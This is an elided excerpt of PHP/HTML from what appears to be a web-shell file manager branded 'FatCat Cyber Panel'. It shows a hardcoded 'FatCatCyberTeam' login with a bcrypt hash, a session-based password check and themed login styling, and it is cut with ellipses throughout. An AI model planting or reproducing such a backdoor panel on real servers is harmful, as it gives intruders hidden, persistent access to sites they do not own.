...
$use_auth = true;
$auth_users = array(
    'FatCatCyberTeam' => '$2y$10$GHxTvVc5wnyZTI3m4LH95uQ5Wpk.RXHl/0tZHr9JYxsat03EyMcey',
);
    ...
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
                ...
                fm_set_msg(lng('FatCat Cyber Panel'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[FM_SESSION_ID]['logged']);
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;Cyber Panel FatCat</a></div>
        <?PHp else: ?>
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;Cyber Panel FatCat</a></div>
        <?PHp endif; ?>
    </div>
...
<head>
    ...
    <style>
        body.fm-login-page{ background-color:#171717;font-size:14px;background-image:url("https://i.ibb.co/1rz9TBh/Fatcat-Cyber-Team-Background.jpg");background-attachment: fixed;}
